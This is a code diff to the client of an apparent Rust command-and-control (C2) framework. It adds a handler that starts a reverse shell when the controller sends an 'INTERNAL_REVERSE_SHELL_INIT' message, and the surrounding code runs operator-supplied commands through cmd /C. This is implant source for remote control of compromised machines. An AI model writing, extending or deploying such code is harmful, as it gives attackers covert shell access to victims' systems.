@@ -6,7 +6,7 @@ use tokio::time::sleep;
 use uuid::Uuid;
 
 // 引入common模块
-use rust_c2_framework::common::*;
+use common::*;
 
 /// C2客户端
 pub struct C2Client {
@@ -120,6 +120,18 @@ impl C2Client {
         &self,
         cmd: &CommandRequest,
     ) -> Result<(), Box<dyn std::error::Error>> {
+        if cmd.command == "INTERNAL_REVERSE_SHELL_INIT" {
+            if let Some(message_json) = cmd.args.get(0) {
+                if let Ok(message) = serde_json::from_str::<Message>(message_json) {
+                    if message.message_type == MessageType::ReverseShell {
+                        println!("Received request to start reverse shell.");
+                        return self.start_reverse_shell().await;
+                    }
+                }
+            }
+            return Err("Invalid INTERNAL_REVERSE_SHELL_INIT command payload".into());
+        }
+
         let output = if cfg!(target_os = "windows") {
             Command::new("cmd")
                 .args(["/C", &cmd.command])
